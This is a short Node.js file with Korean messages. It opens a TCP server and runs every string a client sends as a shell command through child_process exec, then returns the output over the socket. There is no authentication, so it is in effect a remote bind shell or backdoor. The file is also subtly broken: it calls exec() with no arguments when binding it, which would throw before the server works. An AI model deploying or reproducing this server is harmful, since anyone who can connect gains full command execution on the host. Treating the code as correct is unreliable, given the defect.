const net = require('net');
const exec = require('child_process').exec();

let server = net.createServer(socket => {
    socket.write(`환영합니다!`);
    let ip = socket.address().address;
    console.log(`${ip}님이 입장하셨습니다.`);

    socket.on('data', data => {
        let order = data.toString();
        exec(order, (error, stdout, stderr) => {
            if (error) {
                console.error(`exec error: ${error}`);
                socket.write(`exec error: ${error.toString()}`);
                return;
            }
            if (stdout) {
                console.log(`stdout: ${stdout}`);
                socket.write(`stdout: ${stdout.toString()}`);
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                socket.write(`stderr: ${stderr.toString()}`);
            }
        });
    });

    socket.on('error', e => {
        console.log(e);
    });
});

const port = process.env.PORT || 5000;
server.listen(port, () => {
    console.log(`Server started at port ${port}`);
});